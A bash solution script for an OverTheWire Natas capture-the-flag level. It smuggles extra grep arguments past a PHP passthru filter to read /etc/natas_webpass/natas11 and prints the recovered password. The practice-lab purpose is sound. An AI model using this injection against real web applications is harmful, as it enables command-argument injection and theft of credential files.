#!/bin/bash
if [ $# -eq 0 ]
  then echo "Please pass the password as argument"
  exit
fi
# The passthru command in php executes a shell command
# In this level, the regular expression /[;|&]/ doesn't allow the characters ; | &
# We could still make a hacky solution like this one:
# -v $(echo password) /etc/natas_webpass/natas10 #
# But an easier option is probably this
# .* /etc/natas_webpass/natas10 #
# The hash symbol is still not escaped and we can just comment out the rest of the line

# We now use the --url-encode option to encode our GET parameter properly
comm="'.*' /etc/natas_webpass/natas11 #"
answer=`curl -Gs --user natas10:$1 --data-urlencode "needle=$comm" "http://natas10.natas.labs.overthewire.org/" | grep -E -o '^[[:alnum:]]{32}'`
echo The password for natas11 is $answer
